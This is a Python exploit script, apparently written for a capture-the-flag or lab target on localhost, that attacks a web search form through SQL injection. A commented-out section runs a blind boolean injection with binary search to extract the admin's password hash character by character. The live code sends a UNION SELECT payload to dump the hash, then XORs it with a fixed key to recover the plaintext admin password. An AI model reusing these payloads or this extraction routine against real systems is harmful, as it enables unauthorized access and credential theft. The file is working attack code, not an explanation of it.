import requests
import math


# # Define constants
# url = "http://localhost:8080/search"  

# def check_character(position, char_value):
#     # Prepare the SQL injection payload to check if the ASCII value at 'position' is less than 'char_value'
#     data = {
#         'name': f'\" AND EXISTS (SELECT 1 FROM members WHERE username = \"admin\" AND SUBSTRING(password_hash, {position}, 1) <= \"{chr(char_value)}\"); -- '
#     }
    
#     try:
#         print(data)  # Print the payload for debugging
#         response = requests.post(url, data=data)
#         return response.text  # Return the response text
#     except requests.exceptions.RequestException as e:
#         print(f"Request failed: {e}")
#         return None  # Return None on failure

# def binary_search_character(position):
#     low = 48   # ASCII value for '0'
#     high = 102  # ASCII value for 'f'
    
#     while low <= high:
#         mid = (low + high) // 2
#         result = check_character(position, mid)
        
#         # Check if "John" is present in the response text
#         if result and "john" in result.lower():  # Use lower() to handle case sensitivity
#             high = mid - 1  # If true, search left (lower ASCII value)
#         else:
#             low = mid + 1  # If false, search right (higher ASCII value)

#     return low  # Return the ASCII value found

# def find_password_hash(length):
#     password_hash = ""
#     for position in range(1, length + 1):
#         ascii_value = binary_search_character(position)
#         if ascii_value <= 102:  # Ensure valid ASCII range for hash characters
#             char = chr(ascii_value)  # Convert ASCII value to character
#             password_hash += char
#             print(f"Character found at position {position}: '{char}'")  # Print found character
#         else:
#             print(f"Invalid ASCII value found: {ascii_value} at position {position}")
#             break  # Break if the ASCII value is out of range

#     return password_hash

# # Assuming the length of the password hash is known; adjust as necessary
# password_hash_length = 12  # Adjust based on expected hash length
# full_password_hash = find_password_hash(password_hash_length)

# print(f"\npassword hash (hex): '{full_password_hash}'")  # Final password hash
# hash_int = int(full_password_hash, 16) 

# print("password hash (binary): " + str(hash_int))

# Define constants


import re

url = "http://localhost:8080/search"  


data = {
    'name': 'hello\" union select password_hash from members where username = \"admin\"; -- '
}
    
response = requests.post(url, data=data)
encrypted_password_match = re.search(r'<p>(.*)</p>', response.text)

if encrypted_password_match:
    print("Admin Password Hash: " + encrypted_password_match.group(1))
else:
    print("Admin Password Hash not found in the response.")
    
# XOR the password hash with 'a5a5a5a5a5a5' which undoes the original XOR

admin_password_hash = encrypted_password_match.group(1)


# XOR the password hash with 'a5a5a5a5a5a5' which undoes the original XOR
xor_operand = "a5a5a5a5a5a5"

# Convert both hex strings to integers
xor_operand_int = int(xor_operand, 16)
admin_password_hash_int = int(admin_password_hash, 16)

# XOR the two integers
final_password_int = xor_operand_int ^ admin_password_hash_int

# Convert the result to hexadecimal
final_password_hex = hex(final_password_int)[2:]  



# Convert the result to ASCII if possible

final_password_ascii = bytes.fromhex(final_password_hex).decode("ascii")
print(f"FINAL PASSWORD!! (ASCII): '{final_password_ascii}'")
